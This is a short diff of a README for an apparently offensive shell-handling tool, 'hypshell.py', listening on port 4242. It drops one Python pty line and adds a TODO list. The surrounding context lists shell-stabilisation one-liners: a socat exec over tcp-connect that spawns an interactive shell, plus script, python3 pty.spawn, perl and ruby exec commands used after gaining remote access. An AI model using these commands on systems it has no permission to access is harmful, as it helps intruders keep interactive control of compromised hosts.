@@ -46,7 +46,6 @@ Feel free to append your own methods to the code.
 ```
 script: /usr/bin/script -qc {shell} /dev/null
 socat: /usr/bin/socat exec:'{shell} -li',pty,stderr,setsid,sigint,sane tcp-connect
-python: python -c 'import pty; pty.spawn("{shell}")'
 python3: python3 -c 'import pty; pty.spawn("{shell}")'
 perl: perl -e 'exec "{shell}";'
 ruby: ruby -e 'exec "{shell}";'
@@ -70,3 +69,7 @@ hypshell.py 4242
 ```
 # License
 GPLv3
+# TODO
+> add more stabilization methods
+> rewrite the tool in C and upload binaries
+> more
